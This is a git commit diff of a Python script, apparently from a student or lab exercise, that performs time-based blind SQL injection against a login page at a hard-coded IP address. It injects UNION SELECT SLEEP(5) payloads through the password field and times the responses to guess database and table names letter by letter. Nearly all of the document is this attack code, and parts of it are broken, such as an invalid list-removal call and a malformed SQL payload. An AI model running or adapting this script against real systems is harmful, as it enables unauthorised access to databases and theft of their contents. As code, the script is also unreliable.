7016f53c835e0e6cabd5a3373e05208dba1bae2c
quentin-csg <qcassaigne73@gmail.com>
2023-03-10 10:53:18 -0500

    sqlmap_version_nul_edit.py

--- code_attente/sqlmap_version_nul_edit.py
+++ code_attente/sqlmap_version_nul_edit.py
@@ -1,10 +1,12 @@
-import requests
 import time
+import requests
 
-def nom_user_db():
-    dictionary = "abcdefghijklmnopqrstuvwxyz_"
+db_names = ""
+table_names = ""
+
+def db_name():
+    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
     a=0
-    db_names = []
     texte = ""
     TIME = 5
     url = "http://51.15.136.118/pageid.php"
@@ -21,8 +23,9 @@ def nom_user_db():
             """print(total_time)
             print(dictionary[j])"""
             a += 1
-            if a >= 28:
-                exit()
+            print(a)
+            if a > 27:
+                break
             if total_time >= TIME:
                 texte += dictionary[j]
                 print(texte)
@@ -30,17 +33,82 @@ def nom_user_db():
                 j = 0
                 a = 0
                 break
-    return texte
+    return(texte)
 
-nom_user_db()
+"""def table_name():
+    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
+    texte = ""
+    TIME = 5
+    url = "http://51.15.136.118/pageid.php"
+    for i in range(1, 99):
+        b=0
+        for j in range(0, len(dictionary)):
+            usr = "idc"
+            faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables
+            passwd = "' UNION SELECT SLEEP(5),1,2 TABLE_NAME FROM information_schema.tables WHERE table_schema='nom_user_db' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
+            print(passwd)
+            start_time = time.time()
+            response = requests.post(url, data={'username': usr, 'password': passwd})
+            end_time = time.time()
+            total_time = end_time - start_time
+            b += 1
+            print(b)
+            print(total_time)
+            print(dictionary[j])
+            if total_time >= TIME:
+                texte += dictionary[j]
+                print(texte)
+                i += 1
+                j = 0
+                b = 0
+                break
+            if b > 27:
+                print(dictionary)
+                for item in dictionary:
+                    for item in texte:
+                        dictionary.remove(texte[item])
+                    print(dictionary)
+            b = 0
+            texte == ""
+            print(texte)
+            continue
+    return(texte)"""
 
-"""
-url = 'http://51.15.136.118/pageid.php'
-db_names = get_db_names(url)
-print(db_names)
+def table_name():
+    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
+    a=0
+    texte = ""
+    TIME = 5
+    url = "http://51.15.136.118/pageid.php"
+    for i in range(1, 99):
+        for j in range(0, len(dictionary)):
+            usr = "idc"
+            """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
+            passwd = "' UNION SELECT SLEEP(5),1,2 TABLE_NAME FROM information_schema.tables WHERE table_schema='nom_user_db' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
+            print(passwd)
+            start_time = time.time()
+            response = requests.post(url, data={'username': usr, 'password': passwd})
+            end_time = time.time()
+            total_time = end_time - start_time
+            """print(total_time)
+            print(dictionary[j])"""
+            a += 1
+            print(a)
+            if a > 27:
+                dictionary.remove[texte[1]]
+            if total_time >= TIME:
+                texte += dictionary[j]
+                print(texte)
+                i += 1
+                j = 0
+                a = 0
+                break
+    return(texte)
 
+db_name()
+table_name()
 
-for db_name in db_names:
+"""for db_name in db_names:
     tables = get_tables(url, db_name)
     for table in tables:
         columns = get_columns(url, db_name, table)
